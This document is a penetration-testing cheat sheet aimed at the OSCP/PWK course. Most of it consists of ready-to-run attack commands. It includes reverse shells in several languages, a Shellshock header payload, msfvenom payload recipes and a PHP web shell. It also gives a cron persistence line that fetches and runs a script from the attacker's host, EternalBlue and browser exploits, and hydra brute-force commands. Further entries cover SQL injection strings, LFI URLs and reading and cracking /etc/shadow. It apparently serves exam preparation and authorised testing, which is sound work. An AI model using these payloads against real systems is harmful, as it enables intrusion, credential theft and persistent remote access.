# Useful Shit

 ###

 # **Note:** I've used \<targetIP\> and \<yourIP\> in this doc for easy find/replace...

 ###


## Getting Started

This guide is pretty PWK/OSCP centric, but can be used in a variety of penetration testing / red-team engagements. I'm going to be building a better organized playbook repo soon. **DO NOT** have any expectation of not getting caught - the below methods are ***VERY LOUD***.

**Grab the VM here:** http://downloads.kali.org/pwk-kali-vm.7z

**PWK Support Page:** https://support.offensive-security.com/#!pwk-kali-vm.md

**OSCP Exam Guide:** https://support.offensive-security.com/#!oscp-exam-guide.md (READ CAREFULLY, COMPLY)

**Quickie on updating fresh PWK Kali VM:**

OffSec recommends against updating/upgrading your PWK VM (and don't use a 64-bit Kali -- your compiler and some other things (like linux buffer overflows) may not work well...). I tend to go against the grain, and since I've got a sysadmin background in *NIX, I went ahead. Do at your own discretion, but don't go looking for support from PWK staff.

  **If you have the following problem when updating:**

```
root@kali:~# apt update && apt upgrade -y
Get:1 http://kali.mirror.globo.tech/kali kali-rolling InRelease [30.5 kB]
Err:1 http://kali.mirror.globo.tech/kali kali-rolling InRelease
  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <devel@kali.org>
Fetched 30.5 kB in 9s (3,094 B/s)
Reading package lists... Done
Building dependency tree       
Reading state information... Done
All packages are up to date.
W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.globo.tech/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <devel@kali.org>
W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <devel@kali.org>
W: Some index files failed to download. They have been ignored, or old ones used instead.
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

**Copy/paste the below to update the apt key for Kali repos:**

  `wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add`

  `apt update && apt upgrade -y`


## Enumeration, Exploitation and Post-ex/PrivEsc Process

1. Start With Network Enumeration.

  1. [NMAP](#nmap)

  2. [Unicornscan](#unicornscan)

  3. Or, a combination of both: [onetwopunch](https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh)

2. Deeply analyze the port scan results, but ***don't overthink it!***

3. Conduct detailed port attacks/enumeration:

  1. NSE Scripts - `/usr/share/nmap/scripts/` --> HTTP-Vuln, SMB-Vuln, `--script smtp-commands`, `--script auth-owners`, etc!

  2. Webserver?
     - Visit, view source, check for robots.txt
     - Dig Deeper - [nikto/dirb](#web-directories)
     - WordPress? wpscan, [WPForce](https://github.com/n00py/WPForce) and/or WPBrute
     - sqlmap may also be a viable option
     - Use Burp/ZAP proxies to inspect requests/responses
     - Vulnerable to [ShellShock](#shellshock)?
     - LFI?
         - /etc/passwd -> insta-list of users
         - /Windows/System32/repair/{sam/system/security} .sav | .bak | .old
     - HTTP PUT? Use `cadaver`, `nmap -sV --script=http-put` or try MSF `exploit/windows/iis/iis_webdav_upload_asp`
          - IIS trick:
            + PUT file.txt;.asp then
            + COPY or MOVE file.txt;.asp -> file.asp
     - HTTPS? Check for Heartbleed ([heartbleed.py](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py)), MSF `auxiliary/scanner/ssl/openssl_heartbleed`, or other similar vulns (CRIME, BEAST...)
        - Read the actual SSL CERT to:
          + find out potential correct vhost to GET
          + is the clock skewed
          + any names that could be usernames for bruteforce/guessing.
  3. [SMB or CIFS](#smb)? nmap smb-check-vulns script, enum4linux, etc.
  4. [SNMP](#snmp)? onesixtyone, snmpwalk, etc.
  5. [SMTP](#smtp)? check for valid users with netcat/VRFY or scripts. Exim? SendMail? - Check sploits.
  6. Some random/weird port? Use telnet or nc to it and see what output we get.

4. Run [`searchsploit`](https://github.com/offensive-security/exploit-database) or Google the service/software version of each port. 
   - Sometimes though, you don't have to use an exploit. You might find something useful on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) ([Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)) or [GTFOBins](https://gtfobins.github.io/).

5. Try to exploit the vulnerability you found with `searchsploit` to gain a limited or root shell - just don't be foolish and DoS shit. It ruins your experience and others' as well.
  - If limited shell then use the linux or windows exploit suggesters, "searchsploit kernel x.x" and search for common weaknesses in the software.


6. Don't stop there!  Post exploitation drills - enumerate deeper, penetrate deeper, get your privilege escalated to root/SYSTEM.
   - Linux? Run [linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py) or [linenum.sh](https://github.com/rebootuser/LinEnum) to make life a bit easier
   - Windows?
   - Check kernel version, search for kernel / local sploits (Windows? -> [Sec-Wiki](https://github.com/SecWiki) for ez-sploits)
   - Check for processes running as an administrator
   - **scripts** (especially on the desktop! <sup>hint hint</sup>);
   - stored credentials (think `runas /savecreds`);
   - **inter- and internal-network links** (`netstat` THAT SHIT, (`sockstat` on BSD <sup>hint hint</sup>))
   - stored sessions/cookies;
   - anything else that'll get you deeper.

7. [Persistence!](#persistence) Save yourself trouble later by persisting now.


8. **SCREENSHOTS**
  - Need to capture hostname local.txt / proof.txt and ipconfig/ifconfig

## Enumeration

### NMAP

`nmap -v -sS -sV -A -T4 -p- -oA nmap-tcp <targetIP>`

`nmap -v -sU -A -T4 -oA nmap-udp <targetIP>`

`nmap -p 135-139,445 --script=smb-vuln* <targetIP>`

`nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1`

`nmap -p 80,443 --script=http-vuln* <targetIP>`

*nmap http put... (-sV is used for ports not in nmap's list [ie: 8585])*

`nmap -sV --script=http-put --script-args=http-put.url=’/meterpreter.asp’,http-put.file=’/root/meterpreter.asp’ -p 80 <targetIP>`

### UNICORNSCAN

**TCP - Quick Scan (network):** `unicornscan -msf -v <targetIP>/24`

**TCP - All Ports:** `unicornscan -i tap0 -I -mT <targetIP>:a`

**UDP - All Ports:** `unicornscan -i tap0 -I -mU <targetIP>:a`

**Scan Switches:**

SCAN TYPE | SWITCH
:--------- | ------:
TCP/SYN | -mT
UDP | -mU
ACK scan | -mTsA
Fin scan | -mTsF
Null scan | -mTs
Xmas scan | -mTsFPU
Connect Scan | -msf -Iv
Full Xmas scan | -mTFSRPAU
scan ports 1-5 | (-mT) host:1-5

**To use another OS fingerprint use the -W switch followed by the numeric value of the OS:**

OS | VALUE
--- | ---:
Cisco (default) | 0
openbsd | 1
Windows XP | 2
p0fsendsyn | 3
FreeBSD | 4
nmap | 5

**IP Spoofing:** `-s` followed by the IP to spoof.

**Dump scan to pcap:** `-w <filename>`

- - - -

### Web directories

- `nikto -o nikto-http.txt -h http://<targetIP>:80`

- `nikto -o nikto-https.txt -h https://<targetIP>:443`

- `dirb http://<targetIP> /usr/share/wordlists/dirb/common.txt -o dirb-http.txt`

- `dirb https://<targetIP> /usr/share/wordlists/dirb/common.txt -o dirb-https.txt`

- `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 20 -o gobuster-dirlist-2.3-medium.txt -u <targetIP>`

- `dirb http://<targetIP> /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t -o dirb-quickhits.txt`

- `wfuzz -w file1.txt -w file2.txt --hc 404 http://<targetIP>/dir/FUZZFUZ2Z`


- **Wordlists:**

 - `/usr/share/wordlists/dirb/common.txt`

 - `/usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt`

 - `/usr/share/seclists/Discovery/Web_Content/common.txt`

 - `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt`

 - `/usr/share/seclists/Discovery/Web-Content/quickhits.txt`

   -- note: you need to use -t option with dirb on the quickhits wordlist (every line begins with forward-slash [/])

### ShellShock

**There are many ways to handle a shellshock vulnerability, from browser extensions/plugins to python scripts to Metasploit...**

- User-Agent method:

Set your user-agent string in your browser or use cURL to rek:

`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<targetIP>/cgi-bin/status`

- msfconsole method:

```
msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
 # set RHOSTS, TARGETURI and adjust CMD to your liking; if your scan pops positive:
msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
 # set RHOSTS and TARGETURI, run or exploit and enjoy your meterpreter session!
```

### SMB
**TCP 139, 445**

- `enum4linux -a <targetIP>`

- `nmap -p 135-139,445 --script=smb-vuln* <targetIP>`

- `nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 <targetIP>`

- `smbmap -u user -p password -d workgroup -H <targetIP>`

- `acccheck -v -t <targetIP> -u root -P /usr/share/wordlists/rockyou.txt`

### NFS
**TCP 2049 / UDP 2049 & multiple ephemeral tcp/udp**

`showmount -e <targetIP>`

### SNMP
**UDP 161**

- `snmpwalk -c public -v1 <targetIP>`

- `onesixtyone -o onesixtyone-communities.txt <targetIP>`

- `snmp-check <targetIP>`

### SMTP
**TCP 25, 110/995, 143/993**
- `smtp-user-enum -M VRFY -U /root/userlist -t <targetIP>`

- `smtp-user-enum -M RCPT -U /root/userlist -t <targetIP>`

- `for user in $(cat /root/userlist); do echo VRFY $user | nc -nv -w 1 <targetIP> 25 2>/dev/null | grep ^”250″;done`

- `ismtp -h <targetIP>:25 -e /root/userlist`

### Mounting Shares

**SMB anon/guest**

`mount -t cifs "//<targetIP>/sharename/" /mnt/cifs -o username=<username>`

**SMB Authenticated**

`mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//<targetIP>/sharename/" /mnt/cifs`

**SMB**

`smbclient -L <targetIP>`

**NFS**

`mount -t nfs <targetIP>:/share /mnt/nfs/`


### Poppin' Shellz:

**Netcat / nc:** `nc -e /bin/sh 10.0.0.1 1234`

**Bash over TCP:** `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

**Python:** `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

**Perl:** `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

**Lua:** `lua -e 'os.execute("nc -e /bin/sh 10.0.0.1 1234")'`

**BSD/NetBSD:** `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`


### Post-Ex:

#### Proof (Linux)

`hostname; cat /etc/issue; uname -a; id; ifconfig; cat /root/proof.txt; cat /etc/{passwd,shadow}`

#### Proof (Windows)

`whoami; type "C:\Users\Administrator.HOSTNAME\Desktop\proof.txt"; ipconfig; systeminfo`

#### Persistence:

- MSF: `run persistence -U -i 5 -p 443 -r <yourIP>` *MSF will whine that this is deprecated, but it'll do it anyway*
- Windoze: `schtasks /create /tn "pwnsauce" /tr C:\Users\Public\persist.exe /sc ONLOGON /ru "System".`
- Linux: `echo "*/5 * * * * curl --insecure http://<yourIP>/img/pretty_pwny.png|sh" | crontab -`

#### Tunnelling Useful Shit

**sshuttle:**

`sshuttle -vNHr user@<targetIP> <IPrange>/24`

**SSH Local Port Forward:**

`ssh -l <user> -L 5901:127.0.0.1:5901 <IP_to_forward_from>`

**proxychains:**

Edit /etc/proxychains.conf if necessary (default port is 9050)

`proxychains <command to run>`


#### MSF USEFUL SHIT

##### Multihandler

```
use exploit/multi/handler

set lport 4455

set lhost <yourIP>

set ExitOnSession false

exploit -j
```

##### Metasploit Scans!

**TCP**

`db_nmap -e tap0 -n -v -Pn -sV -sC --version-light -A -p- <targetIP>`

**UDP**

`db_nmap -e tap0 -n -v -Pn -sV -sC --version-light -A -sU -p- <targetIP>`


Import Scans

`db_import /path/to/nmap.xml`

#### Eternalblue

**Not useful when scanning linux boxes, buuuuuut**

`use auxiliary/scanner/smb/smb_ms17_010`

**x86 / 64:**

```
cd /root/

git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git

cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /root/.msf4/modules/

msfconsole > reload_all

use exploit/windows/smb/eternalblue_doublepulsar
```

**Built-in MSF (x64 ONLY - Win7, Win Server 2008 R2)**

`use exploit/windows/smb/ms17_010_eternalblue`

** x86 x64 - requires a named pipe**

`use exploit/windows/smb/ms17_010_psexec`

**Client Side Exploits**

- `use exploit/windows/browser/ms10_002_aurora`

- `use exploit/windows/browser/ie_execcommand_uaf`

- Set it up, then embed an iframe or something in the client-accessible codespace like:

 `<iframe src="http://<yourIP>:8080/hM4zWdD3yABLd"></iframe>`

- https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/

- - - -

#### MSFVENOM Payloads:

Type | Command
---- | -------
**Linux** | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=4455 -f elf > shell.elf`
**Windows** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=4455 -f exe > shell.exe`
**PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<yourIP> LPORT=4455 -f raw > shell.php`
**ASP** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=4455 -f asp > shell.asp`
**JSP** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<yourIP> LPORT=4455 -f raw > shell.jsp`
**WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<yourIP> LPORT=4455 -f war > shell.war`
**Python** | `msfvenom -p cmd/unix/reverse_python LHOST=<yourIP> LPORT=4455 -f raw > shell.py`

- - - -

### Compiling

#### Windoze shit

**C**

`i686-w64-mingw32-gcc hello.c -o hello32.exe      # 32-bit`

`x86_64-w64-mingw32-gcc hello.c -o hello64.exe    # 64-bit`

**C++**

`i686-w64-mingw32-g++ hello.cc -o hello32.exe     # 32-bit`

`x86_64-w64-mingw32-g++ hello.cc -o hello64.exe   # 64-bit`

#### \*Nix shit

`gcc -m32 -Wl,--hash-style=both -o`

- - - -

### Brute Force

#### RDP sessions:

`hydra -t 1 -V -f -l administrator -P passwordlist rdp://<targetIP>`

`hydra -t 1 -V -f -L /root/userlist -P /root/passwordlist rdp://<targetIP>`

#### SSH:

`hydra -f -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt <targetIP> ssh`

`ncrack -p 22 --user <user> -P /usr/share/wordlists/rockyou.txt <targetIP>`

#### SSH Weak Keys:

**Debian OpenSSL Predictable PRNG** - https://github.com/g0tmi1k/debian-ssh

`crowbar -b sshkey -U userlist -k /usr/share/weak-ssh-keys/dsa/1024/ -s <targetIP>/32`

#### Web Forms:

`hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>`

`hydra -L userlist -p passwordlist <target>`

- - - -

### Miscellaneous

**Runas**

`C:\WINDOWS\system32\runas.exe /user:administrator /savecreds cmd.exe`

**Pop a Bash TTY**

`python -c 'import pty;pty.spawn("/bin/bash")'`

**Shell Escapes**

- `vi-->	:!bash`
- `vi-->	:set shell=/bin/bash:shell`
- `vi-->	:!bash`
- `vi-->	:set shell=/bin/bash:shell`
- `awk-->	awk 'BEGIN {system("/bin/bash")}'`
- `find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;`
- `perl-->	perl -e 'exec "/bin/bash";'`
- `nmap --interactive !sh`

**Impromptu Web Servers**

`python -m SimpleHTTPServer 80`

`php -S 0.0.0.0:80 -t .`

**PHP Remote Code Execution:**

`<?php echo shell_exec($_GET['cmd']);?>`

`<?php print shell_exec('/bin/bash >& /dev/tcp/<attackerIP>/<nc port> 0>&1'); ?>`

**PHP LFI**

`http://<target>/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../../../../../../../../../`

`http://<target>/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../usr/local/www/phpmyadmin/index.php`

**Find all SUID binaries:**

`find / -perm +6000 -type f -exec ls -ld {} \;`

`find / -user root -perm -4000 -print 2>/dev/null`

**SQL Injection strings:**

```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

**MSSQL Server sqlmap string**

`sqlmap -u http://<target> --dbms="Microsoft SQL Server 2000" --data="txtLoginID=admin&txtPassword=test&cmdSubmit=Login" -p txtLoginID --method=POST`

### Crackin' Passwords 'n' Shit

#### Hashcat-ing:

**Windoze:**

`hashcat64.exe -m 400 -a 0 -o hashcatted.txt --remove WORDPRESS_HASH e:\wordlists\rockyou.txt`

`hashcat64.exe -m 1000 NTLM_HASH_HERE e:\wordlists\rockyou.txt`

#### JtR // John:

1. `cd loot`

2. `unshadow passwd shadow > unshadow`

3. `john --wordlist=/usr/share/wordlists/rockyou.txt unshadow` **or**

- - - -

### Buffer Overflow Useful Shit

**PROCESS**

1. Fuzzing: Determine length of overflow trigger w/ binary search "A"x1000

2. Determine exact EIP with `msf-pattern_create` & `msf-pattern_offset`

3. Determine badchars to make sure all of your payload is getting through

  1. No, **REALLY** check **EVERY** character!

4. Develop exploit
  - Is the payload right at ESP?
  -- Find a `JMP ESP`!
  -- Sprinkle some nops (\x90)... about 16 should do.
  - Is the payload before ESP?
  -- `sub ESP, 200` and then `JMP ESP`
  -- or
  -- `call [ESP-200]`

5. `msfvenom -a x86 --platform linux | windows -p linux | windows/shell/reverse_tcp lhost=<yourIP> lport=443 -f c -o shellcode.c -e x86/shikata_ga_nai`
  - Make sure it fits your payload length above

6. Gain shell, local priv esc or rooted already?

### TOOLZ

GCHQ CyberChef - https://gchq.github.io/CyberChef/

Empire (kind of a big deal) - https://github.com/EmpireProject/Empire

Hashcat - https://hashcat.net/hashcat/

John The Ripper - http://www.openwall.com/john/

JtR Jumbo - https://github.com/magnumripper/JohnTheRipper

Corelan mona.py for Immunity Debugger - https://github.com/corelan/mona/blob/master/mona.py

Immunity Debugger - http://debugger.immunityinc.com/

IDA - https://www.hex-rays.com/products/ida/support/download_freeware.shtml

- - - -

### Cheat Sheets

https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf

https://highon.coffee/blog/nmap-cheat-sheet/

http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf

http://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://www.sans.org/security-resources/GoogleCheatSheet.pdf

https://www.tunnelsup.com/python-cheat-sheet/

https://www.tunnelsup.com/metasploit-cheat-sheet/

- - - -

### Bookmarks:

**PWK Support Page:** https://support.offensive-security.com/#!pwk-kali-vm.md

**OSCP Exam Guide:** https://support.offensive-security.com/#!oscp-exam-guide.md (READ CAREFULLY, COMPLY)

***SECLISTS GITHUB -*** https://github.com/danielmiessler/SecLists

```
SecLists is now a Kali tool!
Install seclists to /usr/share/seclists:
apt -y install seclists
```

**Sec-Wiki - Exploits:** https://github.com/SecWiki

**AusJock - PrivEsc Exploits:** https://github.com/AusJock/Privilege-Escalation

`git clone https://github.com/AusJock/Privilege-Escalation.git`

**PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
   *Reverse Shell Cheatsheet:* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md)

**GTFOBins:** https://gtfobins.github.io/

Nmap cheat sheet - https://highon.coffee/blog/nmap-cheat-sheet/

Windows Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html

Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Windows BOF PCMan FTP - http://netsec.ws/?p=180

Nishang : PowerShell scripts - https://github.com/samratashok/nishang

Pentest Tips and Tricks - https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/

OneTwoPunch - https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh

SambaCry Sploit:
   - https://github.com/opsxcq/exploit-CVE-2017-7494.git
   - https://github.com/omri9741/cve-2017-7494

RDP Sploit: https://github.com/BlackMathIT/Esteemaudit-Metasploit

Debian OpenSSL Predictable PRNG - https://github.com/g0tmi1k/debian-ssh

Debian Predictable PRNG Brute Force SSH (Python) - https://www.exploit-db.com/exploits/5720/

Linux Priv Checker (Python) https://www.securitysift.com/download/linuxprivchecker.py

LinEnum (BASH) https://github.com/rebootuser/LinEnum

Windows PrivEsc Check https://github.com/pentestmonkey/windows-privesc-check

Brute Forcer https://github.com/intrd/nozzlr

Run/test PHP in multiple versions: https://3v4l.org
